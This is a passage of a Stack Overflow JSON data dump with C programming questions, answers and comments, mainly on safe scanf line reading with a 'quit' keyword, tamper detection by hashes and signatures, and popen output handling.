with their use of <code>scanf</code>:</p>\n\n<blockquote>\n  <ol>\n  <li>You are using an incorrect format string; and</li>\n  <li>You fail to check the return of <code>scanf</code>.</li>\n  </ol>\n</blockquote>\n\n<p>Let's address first things first:</p>\n\n<pre><code>scanf(\"%[^\\n]c\", string);\n</code></pre>\n\n<p>Your format string <code>\"%[^\\n]c\"</code> uses the <em>character-class</em> format specifier <code>\"%[...]\"</code> to read the text for <code>string</code>. It is then followed by <code>\"c\"</code> -- which will only match a literal <code>'c'</code> at the end of your input string. That cannot happen as written because <code>\"%[^\\n]\"</code> will read all characters that are not the <code>'\\n'</code> leaving only the <code>'\\n'</code> to be read -- <em>which does NOT match</em> <code>'c'</code>.</p>\n\n<p>Further, the <code>\"%[...]\"</code> specifier along with the <code>\"%c\"</code> specifier do NOT <em>consume leading whitespace</em> (the <code>'\\n'</code> being whitespace). So having left the <code>'\\n'</code> unread in <code>stdin</code> your next call to <code>scanf</code> fails because <code>\"%[^\\n]\"</code> will not read the <code>'\\n'</code> and it doesn't match <code>'c'</code> leading to a <em>matching failure</em>, the <code>'\\n'</code> remains unread in <code>stdin</code> and things quickly spiral out of control.</p>\n\n<p>To solve all of the problems you need to remember <code>(2.)</code> above and also use a <em>field-width</em> modifier to protect the array bounds of <code>string</code>, and you should then read and <em>Save</em> the character following those extracted and put in <code>string</code> to <strong><em>validate</em></strong> a complete line of input was read -- and if not, it is <strong><em>your responsibility</em></strong> to remove any excess characters that remain in <code>stdin</code> <strong><em>before</em></strong> attempting your next read.</p>\n\n<p>For starters, you can use a properly limited <em>format string</em> that includes a <code>space</code> at the beginning that will cause <code>scanf</code> to discard all leading whitespace, e.g.</p>\n\n<pre><code>    \" %199[^\\n]%c\"\n</code></pre>\n\n<p>Note above the final character will be saved, <strong><em>two</em></strong> conversions will take place, so you will need a character variable to handle result of the final conversion specifier, e.g.</p>\n\n<pre><code>    do {\n        char c;     /* final character read */\n        int retn;   /* variable to save scanf return */\n        /* prompt */\n        fputs (\"Enter a bunch of words ('quit' exits): \", stdout);\n        /* read saving scanf return */\n        retn = scanf (\" %199[^\\n]%c\", string, &amp;c);\n</code></pre>\n\n<p>(<strong>note:</strong> the prompt has been moved within the <code>do {...} while (..);</code> loop)</p>\n\n<p>Next <strong><em>you</em></strong> are responsible for checking the <strong><em>return</em></strong> of <code>scanf</code> <em>every time</em>. You must handle <strong><em>three conditions</em></strong></p>\n\n<ol>\n<li><code>(return == EOF)</code> the user canceling input by generating a manual <code>EOF</code> by pressing <kbd>Ctrl+d</kbd> (or on windows <kbd>Ctrl+z</kbd>);</li>\n<li><code>(return &lt; expected No. of conversions)</code>, you must handle the <em>matching</em> or <em>input</em> failure and you must account for every character that may be left in your input buffer. (generally you will scan forward in the input buffer until a <code>'\\n'</code> or <code>EOF</code> is found discarding any extraneous characters that remain, see the <code>empty_stdin()</code> function in the example); and</li>\n<li><code>(return == expected No. of conversions)</code> indicating a successful read -- it is then up to you to check whether the input meets any additional criteria (e.g. positive integer, positive floating-point, etc..).</li>\n</ol>\n\n<p>Putting it altogether, you could handle you loop reading with <code>scanf</code> and looking for <code>\"quit\"</code> as the keyword prompting exit as follows:</p>\n\n<pre><code>    do {\n        char c;     /* final character read */\n        int retn;   /* variable to save scanf return */\n        /* prompt */\n        fputs (\"Enter a bunch of words ('quit' exits): \", stdout);\n        /* read saving scanf return */\n        retn = scanf (\" %199[^\\n]%c\", string, &amp;c);\n        if (retn == EOF) {      /* check the return against EOF */\n            fputs (\"(user canceled input)\\n\", stderr);\n            return 0;\n        }\n        else if (retn &lt; 2) {    /* checking both string and c read */\n            fputs (\"input failure.\\n\", stderr);\n            empty_stdin();\n        }\n        else if (c != '\\n') {   /* check c is '\\n', else string too long */\n            fprintf (stderr, \"warning: input exceeds %d characters.\\n\",\n                    MAXC - 1);\n            empty_stdin();\n        }\n        else    /* good input, output string */\n            printf (\"string: %s\\n\", string);\n\n    } while (strcmp (string,\"quit\") != 0);\n</code></pre>\n\n<p>Finally do NOT use <em>magic-numbers</em> in your code (<code>200</code> is a <em>magic-number</em>). Instead, if you need a <em>constant</em>, <code>#define</code> one (or more). The only place you must hard-code numbers are for example the <code>scanf</code> <em>field-width</em> modifier -- which cannot use a variable, Macro or named constant. That is one exception to the rule. Likewise, do NOT hardcode filenames or paths. All functions take arguments, even <code>main()</code>, pass the needed information to your program.</p>\n\n<p>Putting it altogether, you could do something like:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAXC 200    /* constant - maximum characters in string */ \n\nvoid empty_stdin (void)\n{\n    int c = getchar();\n    while (c != EOF &amp;&amp; c != '\\n')\n        c = getchar();\n}\n\nint main (void) {\n\n    char string[MAXC];    /* use constants for array bounds */\n\n    do {\n        char c;     /* final character read */\n        int retn;   /* variable to save scanf return */\n        /* prompt */\n        fputs (\"Enter a bunch of words ('quit' exits): \", stdout);\n        /* read saving scanf return */\n        retn = scanf (\" %199[^\\n]%c\", string, &amp;c);\n        if (retn == EOF) {      /* check the return against EOF */\n            fputs (\"(user canceled input)\\n\", stderr);\n            return 0;\n        }\n        else if (retn &lt; 2) {    /* checking both string and c read */\n            fputs (\"input failure.\\n\", stderr);\n            empty_stdin();\n        }\n        else if (c != '\\n') {   /* check c is '\\n', else string too long */\n            fprintf (stderr, \"warning: input exceeds %d characters.\\n\",\n                    MAXC - 1);\n            empty_stdin();\n        }\n        else    /* good input, output string */\n            printf (\"string: %s\\n\", string);\n\n    } while (strcmp (string,\"quit\") != 0);\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/scanf_string_quit\nEnter a bunch of words ('quit' exits): Hello\nstring: Hello\nEnter a bunch of words ('quit' exits): My dog has fleas and my cat has none.\nstring: My dog has fleas and my cat has none.\nEnter a bunch of words ('quit' exits): quit\nstring: quit\n</code></pre>\n\n<p>Generating a manual <code>EOF</code> with <kbd>Ctrl+d</kbd> (or <kbd>Ctrl+z</kbd> on windoze):</p>\n\n<pre><code>$ ./bin/scanf_string_quit\nEnter a bunch of words ('quit' exits): Hello\nstring: Hello\nEnter a bunch of words ('quit' exits): (user canceled input)\n</code></pre>\n\n<p>Resetting <code>MAXC</code> to <code>20</code> and the <em>field width</em> modifier to <code>scanf</code> to <code>19</code> you can check the handling of lines that are too long, e.g. the first input fits, the second is too long:</p>\n\n<pre><code>$ ./bin/scanf_string_quit\nEnter a bunch of words ('quit' exits): my dog has fleas and my cat has none.\nwarning: input exceeds 19 characters.\nEnter a bunch of words ('quit' exits): 1234567890123456789\nstring: 1234567890123456789\nEnter a bunch of words ('quit' exits): 12345678901234567890\nwarning: input exceeds 19 characters.\nEnter a bunch of words ('quit' exits): quit\nstring: quit\n</code></pre>\n\n<p>Look things over and let me know if you have further questions.</p>\n"}], "owner": {"reputation": 97, "user_id": 11162470, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wi2Ex0rR0zA/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfztb0Z86CxT9JYZ3_lkpt0pRG16Q/mo/photo.jpg?sz=128", "display_name": "anon", "link": "https://stackoverflow.com/users/11162470/anon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1264, "favorite_count": 0, "accepted_answer_id": 55034025, "answer_count": 3, "score": 2, "last_activity_date": 1551916954, "creation_date": 1551912399, "last_edit_date": 1551912479, "question_id": 55033405, "link": "https://stackoverflow.com/questions/55033405/type-quit-to-quit-c-program", "title": "Type Quit to Quit C Program", "body": "<p>I was wondering what the problem with my program is. I can't get the program to exit when I type quit.\nHere is what I have:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) {\n\n    char string[200];\n\n    printf(\"Enter a bunch of words: \");\n    do\n    {\n        scanf(\"%[^\\n]c\", string);\n\n\n    }while(strcmp(string,\"quit\")!=0);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "embedded", "checksum"], "comments": [{"owner": {"reputation": 1782, "user_id": 10548514, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Hky6xOH08T4/AAAAAAAAAAI/AAAAAAAABSM/Tw8IuIniovs/photo.jpg?sz=128", "display_name": "Juan Carlos Ramirez", "link": "https://stackoverflow.com/users/10548514/juan-carlos-ramirez"}, "edited": false, "score": 3, "creation_date": 1551912588, "post_id": 55033349, "comment_id": 96819313, "body": "Rather than a checksum, you should use a cryptographically secure hash function if you want to protect against tampering."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1551917549, "post_id": 55033349, "comment_id": 96820777, "body": "Which is more important: &quot;detect tampering&quot; or &quot;does not use a lot of cycles to compute&quot; or <i>both</i> (meaning you&#39;ll get neither)."}, {"owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551924657, "post_id": 55033349, "comment_id": 96822345, "body": "@chux: both I guess :) I have updated the question to give some background on where this is coming from.."}], "answers": [{"comments": [{"owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "edited": false, "score": 0, "creation_date": 1551913891, "post_id": 55033563, "comment_id": 96819800, "body": "Thanks for the response !"}, {"owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 1, "creation_date": 1551914047, "post_id": 55033563, "comment_id": 96819857, "body": "SHA256 doesn&#39;t prevent tampering, though\u2026"}, {"owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "reply_to_user": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "edited": false, "score": 0, "creation_date": 1551914711, "post_id": 55033563, "comment_id": 96820059, "body": "@duskwuff: Do you have any suggestions for my use case?"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 1, "last_activity_date": 1551943374, "last_edit_date": 1551943374, "creation_date": 1551913221, "answer_id": 55033563, "question_id": 55033349, "link": "https://stackoverflow.com/questions/55033349/fast-and-robust-checksum-algo-for-a-small-data-file-10kb/55033563#55033563", "title": "Fast and robust checksum algo for a small data file (~10KB)", "body": "<p>For your purpose, you can use a cryptographic hash such as SHA256. It is very reliable and collisions are abysmally unlikely but you should test if the speed is OK.</p>\n\n<p>There is a sample implementation in this response: <a href=\"https://stackoverflow.com/a/55033209/4593267\">https://stackoverflow.com/a/55033209/4593267</a></p>\n\n<p>To detect intentional tampering with the data, you can add a secret key to the hashed data. The device will need to have a copy of the secret key, so it is not a very secure method as the key could be extracted from the device through reverse engineering or other methods. If the device is well protected against that, for example if it is inside a secure location, a secure chip or in a very remote location such as a satellite in space and you are confident there are no flaws providing remote access, this may be sufficient.</p>\n\n<p>Otherwise an asymmetrical cryptographic system is required, with a private key known only to the legitimate source(s) of those data files, and a public key used by the device to verify the cryptographic hash, as documented in duskwuff's answer.</p>\n"}, {"tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": true, "score": 4, "last_activity_date": 1551917837, "creation_date": 1551917837, "answer_id": 55034200, "question_id": 55033349, "link": "https://stackoverflow.com/questions/55033349/fast-and-robust-checksum-algo-for-a-small-data-file-10kb/55034200#55034200", "title": "Fast and robust checksum algo for a small data file (~10KB)", "body": "<blockquote>\n  <p>My intention is to detect tampering with the contents of this file</p>\n</blockquote>\n\n<p>If you need to detect intentional tampering with a file, you need some sort of cryptographic <em>signature</em> -- not just a hash.</p>\n\n<p>If you can protect a key within the device, using <a href=\"https://en.wikipedia.org/wiki/HMAC\" rel=\"nofollow noreferrer\">HMAC</a> as a signature algorithm may be sufficient. However, if the secret is extracted from the device, users will be able to use this to forge signatures.</p>\n\n<p>If you cannot protect a key within the device, you will need to use an asymmetric signature algorithm. <a href=\"https://libsodium.gitbook.io/doc/public-key_cryptography/public-key_signatures\" rel=\"nofollow noreferrer\">Libsodium's <code>crypto_sign</code> APIs</a> provide a nice API for this. Alternatively, if you want to use the underlying algorithms directly, <a href=\"https://en.wikipedia.org/wiki/EdDSA\" rel=\"nofollow noreferrer\">EdDSA</a> is a decent choice.</p>\n\n<p>Either of these options will require a relatively large amount of space (32 to 64 bytes) to be allocated for a signature, and verifying that signature will take significantly more time than a noncryptographic signature. This is largely unavoidable if you need to effectively prevent tampering.</p>\n"}, {"tags": [], "owner": {"reputation": 4427, "user_id": 193887, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/54a2fc2a8cb81440a442aa45fc0f41a9?s=128&d=identicon&r=PG&f=1", "display_name": "Jeremy", "link": "https://stackoverflow.com/users/193887/jeremy"}, "is_accepted": false, "score": 1, "last_activity_date": 1552313929, "creation_date": 1552313929, "answer_id": 55103930, "question_id": 55033349, "link": "https://stackoverflow.com/questions/55033349/fast-and-robust-checksum-algo-for-a-small-data-file-10kb/55103930#55103930", "title": "Fast and robust checksum algo for a small data file (~10KB)", "body": "<p>If you're only concerned about accidental or non-malicious tampering, a CRC should be sufficient.</p>\n\n<p>(I'm using a somewhat circular definition of 'malicious' here: if somebody goes to the trouble of recalculating or manipulating the CRC to get their edits to work, that counts as 'malicious' and we don't defend against it.)</p>\n"}], "owner": {"reputation": 2024, "user_id": 1315171, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/081b87a82980b9c47ce10d65653ffe57?s=128&d=identicon&r=PG", "display_name": "Zakir", "link": "https://stackoverflow.com/users/1315171/zakir"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "closed_date": 1552901466, "accepted_answer_id": 55034200, "answer_count": 3, "score": 0, "last_activity_date": 1552313929, "creation_date": 1551912066, "last_edit_date": 1551924525, "question_id": 55033349, "link": "https://stackoverflow.com/questions/55033349/fast-and-robust-checksum-algo-for-a-small-data-file-10kb", "closed_reason": "Opinion-based", "title": "Fast and robust checksum algo for a small data file (~10KB)", "body": "<p>I have a data file that needs to be pushed to an embedded device. The typical size for the file ranges from a few bytes to about 10K max. My intention is to detect tampering with the contents of this file(chksum to be last element in the data file). The data range is a mix of strings, signed and unsigned integers. I am looking for a robust algo to avoid a lot of collisions as well something that does not use a lot of cycles to compute. I am considering <code>Fletcher16()</code>, <code>CRC-32</code> and the solution <a href=\"https://stackoverflow.com/questions/45633170/is-fletchers16-checksum-suitable-for-small-data\">discussed in this post</a></p>\n\n<p>Any suggestions for a simple algo for my kind of data size/contents?</p>\n\n<p>Thanks in advance!</p>\n\n<p><strong>EDIT:-</strong>\nThanks everyone for the insightful answers and suggestions. </p>\n\n<p>Some background: This is not a hyper secure data file. I just want to be able to detect whether someone wrote it by mistake. The file gets generated by a module and should be just <code>read only</code> by the SW. Recently there has been a few instances where folks have pulled it from the target file system, edited and pushed back to the target hoping that would fix their problems. (Which btw it would if edited carefully). But this defeats the very purpose of auto generatating this file and the existence of this module. I would like to detect and such playful \"<em>hacks</em>\" and <em>abort gracefully</em>.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 12, "creation_date": 1551911412, "post_id": 55033177, "comment_id": 96818851, "body": "Why do you need an alternative? What&#39;s wrong with the code you posted?"}, {"owner": {"reputation": 4060, "user_id": 763355, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/dxAhW.jpg?s=128&g=1", "display_name": "MoDJ", "link": "https://stackoverflow.com/users/763355/modj"}, "edited": false, "score": 3, "creation_date": 1551911707, "post_id": 55033177, "comment_id": 96818961, "body": "You could use a series of if else statements or you could lookup a set of values in a table."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1551911827, "post_id": 55033177, "comment_id": 96819009, "body": "You could use an array of function pointers indexed by the character. But there&#39;s really no reason to use anything other than the <code>switch</code> statement."}, {"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 1, "creation_date": 1551912624, "post_id": 55033177, "comment_id": 96819334, "body": "Again, you need to state what is wrong with your current code and what you are trying to accomplish."}], "answers": [{"tags": [], "owner": {"reputation": 512, "user_id": 6101126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2be7f7a86ee63ee179d839c721f2d64?s=128&d=identicon&r=PG&f=1", "display_name": "binky", "link": "https://stackoverflow.com/users/6101126/binky"}, "is_accepted": true, "score": 0, "last_activity_date": 1551913974, "creation_date": 1551913974, "answer_id": 55033668, "question_id": 55033177, "link": "https://stackoverflow.com/questions/55033177/what-are-the-alternatives-to-switch-case-statements-in-c/55033668#55033668", "title": "What are the alternatives to switch-case statements in C?", "body": "<p>But to answer the question, you could use a bunch of if/else statements:</p>\n\n<pre><code>while ( ( c = getopt( argc, argv, \"s:E:b:t:vh\" ) ) != -1 )\n{\n    if ( c == 's' )\n    {\n        params.s = atoi( optarg );\n    }\n    else if ( c == 'E' )\n    {\n        params.E = atoi( optarg );\n    }\n    else if ( c == 'b' )\n    {\n        params.b = atoi( optarg );\n    }\n    else if ( c == 't' )\n    {\n        trace_file = optarg;\n    }\n    else if ( c == 'v' )\n    {\n        verbosity = 1;\n    }\n    else\n    {\n        // always have some kind of default clause\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11162426, "user_type": "registered", "profile_image": "https://graph.facebook.com/2198060786944926/picture?type=large", "display_name": "Swarnava Chatterjee", "link": "https://stackoverflow.com/users/11162426/swarnava-chatterjee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 932, "favorite_count": 0, "accepted_answer_id": 55033668, "answer_count": 1, "score": -2, "last_activity_date": 1551913974, "creation_date": 1551911255, "last_edit_date": 1551911470, "question_id": 55033177, "link": "https://stackoverflow.com/questions/55033177/what-are-the-alternatives-to-switch-case-statements-in-c", "title": "What are the alternatives to switch-case statements in C?", "body": "<p>Here's my code below:</p>\n\n<pre><code>while ( ( c = getopt( argc, argv, \"s:E:b:t:vh\" ) ) != -1 )\n{\n  switch ( c )\n  {\n     case 's':\n        params.s = atoi( optarg );\n        break;\n     case 'E':\n        params.E = atoi( optarg );\n        break;\n     case 'b':\n        params.b = atoi( optarg );\n        break;\n     case 't':\n        trace_file = optarg;\n        break;\n     case 'v':\n        verbosity = 1;\n        break;\n  }\n}\n</code></pre>\n"}, {"tags": ["c", "assembly", "operating-system"], "owner": {"reputation": 156, "user_id": 8313610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7b4090fc4475fbbbd0693050d66dd969?s=128&d=identicon&r=PG&f=1", "display_name": "Elvin", "link": "https://stackoverflow.com/users/8313610/elvin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 66, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1551909705, "creation_date": 1551909705, "question_id": 55032858, "link": "https://stackoverflow.com/questions/55032858/how-to-use-debugging-tools-to-your-own-kernel", "title": "How to use debugging tools to your own kernel", "body": "<p>I've my own boot.asm which boots my PE kernel.cpp. So I need to see and be aware of every step done in kernel in debugging purposes. How can I connect gdb with qemu if I have to use windows.</p>\n"}, {"tags": ["c", "linux", "file", "popen"], "comments": [{"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 3, "creation_date": 1551908658, "post_id": 55032608, "comment_id": 96817811, "body": "if you want to put the result of commands into a file you do not need <i>popen</i> just use <i>system</i> to execute your command redirecting the output in your file (e.g. <code>system(&quot;command &gt; file&quot;);</code> the goal of <i>popen</i> is to read/write from/to command output/input without using a file"}, {"owner": {"reputation": 45749, "user_id": 21974, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/61d62f97373c96dea8ad1e774b127cdd?s=128&d=identicon&r=PG", "display_name": "ypnos", "link": "https://stackoverflow.com/users/21974/ypnos"}, "edited": false, "score": 1, "creation_date": 1551908736, "post_id": 55032608, "comment_id": 96817844, "body": "<code>popen</code> opens a pipe. Pipes are not files. They are unidirectional streams between the two processes and are buffered in memory only."}, {"owner": {"reputation": 129, "user_id": 9722753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/916b17b90cee999f2ee7720381db57f6?s=128&d=identicon&r=PG&f=1", "display_name": "SimpleName", "link": "https://stackoverflow.com/users/9722753/simplename"}, "edited": false, "score": 0, "creation_date": 1551908767, "post_id": 55032608, "comment_id": 96817861, "body": "that&#39;s true, my mistake. I edited it ;)"}, {"owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1551909120, "post_id": 55032608, "comment_id": 96818025, "body": "Technically, on Linux, pipes <i>are</i> files. They&#39;re stored on a special internal-only fs <code>pipefs</code> that makes up its own root. This fun fact is an implementation detail that has exactly zero relevance to this question."}, {"owner": {"reputation": 3975, "user_id": 8513665, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c39368317b0749f5d8f09735796c470e?s=128&d=identicon&r=PG&f=1", "display_name": "Christian Gibbons", "link": "https://stackoverflow.com/users/8513665/christian-gibbons"}, "reply_to_user": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1551909399, "post_id": 55032608, "comment_id": 96818143, "body": "@thatotherguy The old <code>Unix</code> idea of &quot;Everything is a file&quot;.  Taken to an even further extreme in <code>Plan 9 From Bell Labs</code>."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1551912415, "post_id": 55032608, "comment_id": 96819228, "body": "@thatotherguy Pipes are not files, they&#39;re just kernel buffers used to pass data between processes. You can read and write them using the same system calls as files, but they&#39;re not stored anywhere. Named pipes are filenames, but there&#39;s no storage associated with them, they just refer to the kernel data."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1551913244, "post_id": 55032608, "comment_id": 96819583, "body": "what you need is fork+exec with the child opening the file descriptor 1 to a file, as simple as that."}, {"owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551913469, "post_id": 55032608, "comment_id": 96819657, "body": "@Barmar On Linux, anonymous pipes are files in much the same sense that named pipes are. <a href=\"https://github.com/torvalds/linux/blob/da2577fe63f865cd9dc785a42c29c0071f567a35/fs/pipe.c#L1154\" rel=\"nofollow noreferrer\">Here&#39;s</a> the source code for the special <code>pipefs</code> that stores them internally. It&#39;s not exposed as an enumerable tree to userspace, but it&#39;s still there."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "edited": false, "score": 0, "creation_date": 1551913558, "post_id": 55032608, "comment_id": 96819690, "body": "@thatotherguy That&#39;s new to Linux, I think, it&#39;s not the way pipes have traditionally been implemented in Unix."}, {"owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1551914402, "post_id": 55032608, "comment_id": 96819962, "body": "@Barmar Minix does the same thing so I&#39;m guessing it&#39;s not new to Linux specifically, but it&#39;s most definitely an implementation detail and not a requirement to implement a Unix clone"}], "owner": {"reputation": 129, "user_id": 9722753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/916b17b90cee999f2ee7720381db57f6?s=128&d=identicon&r=PG&f=1", "display_name": "SimpleName", "link": "https://stackoverflow.com/users/9722753/simplename"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551908972, "creation_date": 1551908460, "last_edit_date": 1551908972, "question_id": 55032608, "link": "https://stackoverflow.com/questions/55032608/temporary-file-with-linux-command-output", "title": "Temporary file with linux command output", "body": "<p>I am struggling with popen() function to get output of linux commands. This function can save output in some pipe and it is possible to read it, but I want to specify name of temporary file. I was thinking about iterating through popen pipe and writing result into new file specified name, but it's probably not the most efficient. Is there any function or tricky way to do that more efficient?</p>\n"}, {"tags": ["c", "shell", "pipe", "fork"], "comments": [{"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "edited": false, "score": 4, "creation_date": 1551908015, "post_id": 55032457, "comment_id": 96817540, "body": "You don&#39;t specifically mention where your question is, what isn&#39;t working, etc."}, {"owner": {"reputation": 233489, "user_id": 14122, "user_type": "registered", "accept_rate": 71, "profile_image": 